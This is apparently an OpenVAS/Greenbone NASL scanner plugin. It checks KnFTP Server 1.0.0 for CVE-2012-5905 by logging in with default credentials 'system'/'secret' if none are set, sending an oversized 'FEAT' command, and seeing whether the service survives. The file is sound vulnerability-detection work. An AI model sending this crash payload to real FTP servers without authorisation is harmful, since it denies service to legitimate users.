if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902826" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_cve_id( "CVE-2012-5905" );
	script_bugtraq_id( 52805 );
	script_tag( name: "cvss_base", value: "4.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-03-29 16:16:16 +0530 (Thu, 29 Mar 2012)" );
	script_name( "KnFTP Server 'FEAT' Command Remote Denial of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/ftp_ready_banner/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52805" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18671" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/111296/knftpd-dos.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to crash the
  affected application, denying service to legitimate users." );
	script_tag( name: "affected", value: "KnFTP Server version 1.0.0." );
	script_tag( name: "insight", value: "The flaw is caused by an error when handling 'FEAT' command, which
  can be exploited to crash the FTP service by sending specially crafted FTP commands." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running KnFTP Server and is prone to denial of service
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "220 FTP Server ready." )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds( default_login: "system", default_pass: "secret" );
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_log_in( socket: soc, user: user, pass: pass );
if(!login_details){
	exit( 0 );
}
exploit = "FEAT " + crap( data: "./A", length: 256 * 3 );
ftp_send_cmd( socket: soc, cmd: exploit );
ftp_close( socket: soc );
sleep( 3 );
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	security_message( ftpPort );
	exit( 0 );
}
ftp_close( socket: soc1 );

